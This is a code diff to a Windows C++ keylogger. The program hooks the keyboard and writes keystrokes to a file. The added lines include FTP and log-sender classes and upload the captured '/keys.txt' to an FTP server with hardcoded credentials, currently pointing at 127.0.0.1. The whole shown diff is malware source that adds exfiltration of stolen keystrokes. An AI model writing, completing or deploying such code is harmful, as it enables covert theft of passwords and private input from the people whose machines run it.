@@ -1,8 +1,10 @@
 #define _WIN32_WINNT 0x0500
 #include <fstream>
 #include <windows.h>
+#include "LogSender.hpp"
+#include "FTP.hpp"
 
-using namespace std;
+// using namespace std;
 
 ofstream out;
 
@@ -64,6 +66,11 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
     }
 
     out.close();
+
+    FTP * ftp = new FTP("127.0.0.1", "kolio", "099824058");
+    LogSender l(ftp);
+    
+    l.send_logs("/keys.txt");
 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
